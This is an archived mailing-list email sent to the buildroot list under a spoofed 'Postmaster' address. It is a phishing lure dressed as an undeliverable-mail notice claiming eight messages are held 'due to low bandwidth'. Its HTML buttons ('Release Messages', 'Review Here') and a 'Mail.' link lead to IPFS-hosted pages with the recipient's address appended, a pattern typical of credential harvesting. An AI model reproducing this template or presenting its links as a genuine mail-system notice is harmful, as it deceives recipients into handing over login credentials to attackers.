Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id DD47BC54E58
	for <buildroot@archiver.kernel.org>; Sat, 23 Mar 2024 23:14:37 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id 1D3B940662;
	Sat, 23 Mar 2024 23:14:37 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id VHn0t6Vxj-o7; Sat, 23 Mar 2024 23:14:35 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 975ED40673
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp4.osuosl.org (Postfix) with ESMTP id 975ED40673;
	Sat, 23 Mar 2024 23:14:35 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id C76E01BF5A8
 for <buildroot@lists.busybox.net>; Sat, 23 Mar 2024 23:14:33 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id B366A814C9
 for <buildroot@lists.busybox.net>; Sat, 23 Mar 2024 23:14:33 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id UTFvNMtgjKle for <buildroot@lists.busybox.net>;
 Sat, 23 Mar 2024 23:14:33 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.132;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 5CBD8814B7
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 5CBD8814B7
Received: from busybox.net (unknown [141.98.10.132])
 by smtp1.osuosl.org (Postfix) with ESMTP id 5CBD8814B7
 for <buildroot@busybox.net>; Sat, 23 Mar 2024 23:14:32 +0000 (UTC)
From: Postmaster <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 24 Mar 2024 00:14:31 +0100
Message-ID: <20240324001431.D0D2001CC8367990@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] =?utf-8?q?Undeliverable=3A_You_have_=288=29_pending_?=
 =?utf-8?b?bWVzc8mRZ2Vz?=
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8122669323793241904=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============8122669323793241904==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<div id=3D":92b" style=3D'color: rgb(34, 34, 34); text-transform: none; tex=
t-indent: 0px; letter-spacing: normal; font-family: "Google Sans", Roboto, =
RobotoDraft, Helvetica, Arial, sans-serif; font-size: medium; font-style: n=
ormal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2=
; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: =
normal; font-variant-caps: normal; text-decoration-style: initial; text-dec=
oration-color: initial; -webkit-text-stroke-width:=20
0px; text-decoration-thickness: initial;'><div class=3D"qQVYZb"><br></div><=
div class=3D"lQs8Hd" jsaction=3D"SN3rtf:rcuQ6b" jscontroller=3D"i3Ohde"></d=
iv><div class=3D"btm"></div></div>
<div style=3D'color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: "Google Sans", Roboto, RobotoDraft,=
 Helvetica, Arial, sans-serif; font-size: medium; font-style: normal; font-=
weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
 background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font=
-variant-caps: normal; text-decoration-style: initial; text-decoration-colo=
r: initial; -webkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial;'><div class=3D"aHl" style=3D"margin-lef=
t: -38px;"></div><div tabindex=3D"-1" id=3D":91y"></div>
<div class=3D"ii gt" id=3D":929" style=3D"margin: 8px 0px 0px; padding: 0px=
; font-size: 0.87rem; position: relative; direction: ltr;" jslog=3D"20277; =
u014N:xr6bB; 1:WyIjdGhyZWFkLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxudWxsLG51=
bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsW11d; 4:WyI=
jbXNnLWY6MTc3ODU4Mjg5MTg5ODM1MTY4MSIsbnVsbCxbXSxudWxsLG51bGwsbnVsbCxudWxsLG=
51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxbXSxbXSxbXV0.">
<div class=3D"a3s aiL " id=3D":92a" style=3D"font: small/1.5 Arial, Helveti=
ca, sans-serif; width: 603px; height: 606px; overflow: hidden; font-size-ad=
just: none; font-stretch: normal;"><u></u><div style=3D"margin: 0.4em;">
<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
; border-top-color: currentColor; border-top-width: 0px; border-top-style: =
none; white-space: normal; box-sizing: border-box; background-color: rgb(24=
4, 248, 245); font-variant-ligatures: normal; font-variant-caps: normal; te=
xt-decoration-style: initial;=20
text-decoration-color: initial;"><div style=3D"width: 593px; height: 43px; =
padding-top: 5px; padding-right: 5px; padding-bottom: 5px; margin-left: 18p=
x; border-top-color: currentColor; border-top-width: 0px; border-top-style:=
 none; float: left; box-sizing: border-box;"><span style=3D"box-sizing: bor=
der-box;"><font size=3D"2"><span style=3D"box-sizing: border-box;"><font si=
ze=3D"2">Message generated from<span>&nbsp;</span>
<a style=3D"color: rgb(17, 85, 204);" href=3D"https://busybox.net" target=
=3D"_blank" data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://m=
edi-cont.hu&amp;source=3Dgmail&amp;ust=3D1696329870830000&amp;usg=3DAOvVaw0=
fBxS8iT8to0LhSccEB9L8">busybox.net</a>&nbsp;source.</font></span><font size=
=3D"2"></font><font size=3D"2"><span style=3D"box-sizing: border-box;"></sp=
an></font></font><font size=3D"2"><span style=3D"box-sizing: border-box;">
<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
und-color: rgb(244, 248, 245);'><br></div></span></font></span><font size=
=3D"2"></font><span style=3D"box-sizing: border-box;"></span>
<div style=3D'font-family: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Taho=
ma, Arial, sans-serif; font-size: 13px; border-top-color: currentColor; bor=
der-top-width: 0px; border-top-style: none; box-sizing: border-box; backgro=
und-color: rgb(244, 248, 245);'><br></div></div><div style=3D"box-sizing: b=
order-box;"><div style=3D"width: 5px; height: 30px; border-top-color: curre=
ntColor; border-top-width: 0px; border-top-style: none; box-sizing: border-=
box; background-color: rgb(86, 166, 89);"></div></div>
</div><div style=3D"text-align: left; color: rgb(44, 54, 58); text-transfor=
m: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto, san=
s-serif; font-size: 14px; font-style: normal; font-weight: 400; word-spacin=
g: 0px; white-space: normal; box-sizing: border-box; background-color: rgb(=
255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
text-decoration-style: initial; text-decoration-color: initial;"><br></div>=

<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Roboto, sans-seri=
f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
; white-space: normal; box-sizing: border-box; background-color: rgb(255, 2=
55, 255); font-variant-ligatures: normal; font-variant-caps: normal; text-d=
ecoration-style: initial; text-decoration-color: initial;">&nbsp;</div>
<table style=3D"width: 629px; text-align: left; color: rgb(44, 54, 58); tex=
t-transform: none; letter-spacing: normal; font-family: calibri; font-size:=
 16px; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
: normal; border-collapse: collapse; box-sizing: border-box; background-col=
or: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: =
normal; text-decoration-style: initial; text-decoration-color: initial;" bo=
rder=3D"0"><tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;"><td align=3D"left" style=3D"margin: 0=
px; box-sizing: border-box;"><table style=3D"width: 627px; border-collapse:=
 collapse; min-width: 600px; box-sizing: border-box;" border=3D"0" cellspac=
ing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr al=
ign=3D"center" style=3D"box-sizing: border-box;"><td style=3D"margin: 0px; =
box-sizing: border-box;">
<table style=3D"border-collapse: collapse; max-width: 600px; box-sizing: bo=
rder-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D=
"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td style=
=3D"margin: 0px; box-sizing: border-box;"><table style=3D"width: 513px; bor=
der-collapse: collapse; box-sizing: border-box;" border=3D"0" cellspacing=
=3D"0" cellpadding=3D"0"></table></td></tr><tr style=3D"box-sizing: border-=
box;"><td style=3D"margin: 0px; box-sizing: border-box;">
<div style=3D"padding: 22px 25.64px 30px; text-align: center; font-family: =
Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 25px; border-top-c=
olor: currentColor; border-bottom-color: rgb(201, 201, 201); border-top-wid=
th: 0px; border-bottom-width: thin; border-top-style: none; border-bottom-s=
tyle: solid; box-sizing: border-box;">Notification of pending&nbsp;8 messag=
es.<br style=3D"box-sizing: border-box;"></div></td></tr><tr style=3D"box-s=
izing: border-box;">
<td style=3D"margin: 0px; box-sizing: border-box;"><div style=3D"border-top=
-color: currentColor; border-top-width: 0px; border-top-style: none; box-si=
zing: border-box;">&nbsp;</div><div style=3D"box-sizing: border-box;">&nbsp=
;</div><font size=3D"1"><font size=3D"2">Some messages are restrained from =
delivering to <u><font color=3D"#0000ff"><a style=3D"color: rgb(17, 85, 204=
);" href=3D"mailto:buildroot@busybox.net" target=3D"_blank">buildroot@busyb=
ox.net</a></font></u><font style=3D"box-sizing: border-box;"><br><br></font=
></font></font>
<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
<font size=3D"2">Due to low bandwidth we notify you to take prompt actions<=
/font></p>
<a style=3D"background: rgb(36, 107, 193); margin: 2px; padding: 10px; outl=
ine: 0px; border: thick currentColor; border-image: none; color: rgb(255, 2=
55, 255); text-decoration: none; float: left; display: block; box-sizing: b=
order-box;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxfe=
df4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_bl=
ank" rel=3D"noreferrer"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
<font size=3D"3">Release Messages</font></a>
<a style=3D"background: rgb(179, 179, 179); margin: 2px; padding: 10px; out=
line: 0px; border: thick currentColor; border-image: none; color: rgb(255, =
255, 255); text-decoration: none; float: left; display: block; box-sizing: =
border-box;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiaw6dgw7wadbmxf=
edf4g5xuee22tbyfcvctqp65lwai6avvvnvivu?#buildroot@busybox.net" target=3D"_b=
lank" rel=3D"noreferrer"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
pfs.com/ipfs/QmZQvyxDWr4LkNi2rmTUucThARVM2DnAresq6upiC3z4Po?filename%3Dinde=
x-update.html%23info@medi-cont.hu&amp;source=3Dgmail&amp;ust=3D169632987083=
0000&amp;usg=3DAOvVaw0ibFTANhQzj-VXz7vNmqeY" data-saferedirectreason=3D"1">=
<font size=3D"3">Review Here</font></a><p style=3D"margin-top: 0px; margin-=
bottom: 1rem; box-sizing: border-box;">&nbsp;</p><p style=3D"margin-top: 0p=
x; margin-bottom: 1rem; box-sizing: border-box;"></p>
<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
&nbsp;</p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: bor=
der-box;"></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing:=
 border-box;"></p><h5 style=3D"line-height: 1.2; font-size: 1.25rem; font-w=
eight: 500; margin-top: 0px; margin-bottom: 0.5rem; box-sizing: border-box;=
"><font size=3D"1"><font size=3D"2"><font size=3D"3"><font size=3D"2">Messa=
ge should be moved to inbox.&nbsp;<span>&nbsp;</span>
<u style=3D"box-sizing: border-box;"><a href=3D"https://cloudflare-ipfs.com=
/ipfs/QmNzHfbXaVaWHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA?filename=3DQmNzHfbXaVa=
WHtrNL3UPmefnVoavavy1gvzmwSDzrWKWwA#buildroot@busybox.net">Mail.</a></u></f=
ont></font></font></font></h5></td></tr></tbody></table></td></tr></tbody><=
/table></td></tr></tbody></table></div></div></div></div></body></html>

--===============8122669323793241904==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============8122669323793241904==--
